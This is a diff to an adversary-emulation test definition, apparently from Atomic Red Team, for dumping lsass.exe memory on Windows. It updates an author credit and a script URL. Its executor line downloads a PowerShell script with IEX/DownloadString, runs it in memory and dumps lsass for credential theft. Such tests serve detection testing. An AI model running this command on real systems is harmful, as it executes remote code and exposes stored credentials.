@@ -220,12 +220,14 @@ atomic_tests:
     The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
     powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
     Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+    
+    Author of Out-Minidump: Matthew Graeber (@mattifestation)
   supported_platforms:
   - windows
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+      IEX (New-Object Net.WebClient).DownloadString('https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'); get-process lsass | Out-Minidump
     cleanup_command: |
       Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
     name: powershell
